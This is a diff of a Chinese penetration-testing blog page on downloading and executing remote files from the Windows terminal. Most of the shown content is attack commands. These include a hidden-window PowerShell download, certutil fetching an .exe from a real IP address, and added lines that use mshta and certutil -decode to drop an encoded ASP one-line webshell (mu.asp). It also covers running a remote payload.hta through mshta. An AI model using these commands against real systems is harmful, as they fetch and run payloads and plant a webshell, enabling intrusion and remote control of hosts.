@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Windows终端下载文件和执行远程文件 - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,网络安全,python,php,linux">
-    <meta name="description" content="在windows的终端下下载文件">
+    <meta name="description" content="在windows的终端下下载文件，在windows的终端下执行远程文件">
     <meta name="author" content="reber">
 
     
@@ -139,6 +139,11 @@ powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile(&quot;htt
 <pre><code class="language-bash">certutil -urlcache -split -f http://114.115.214.203/test.txt test.txt
 
 certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe
+
+#写文件的方法：
+mshta vbscript:createobject(&quot;scripting.filesystemobject&quot;).createtextfile(&quot;test11.txt&quot;,2,ture).writeline(&quot;PCVleGVjdXRlKHJlcXVlc3QoImwiKSklPg==&quot;)(window.close)
+certutil -decode test11.txt mu.asp #一句话马
+type mu.asp
 </code></pre>
 
 <h3 id="0x03-mshta执行远程hta">0x03 mshta执行远程hta</h3>
@@ -148,7 +153,7 @@ certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe
 
 <p>payload.hta</p>
 
-<pre><code>&lt;!DOCTYPE html&gt;
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
 &lt;html lang=&quot;en&quot;&gt;
 &lt;head&gt;
     &lt;meta charset=&quot;UTF-8&quot;&gt;
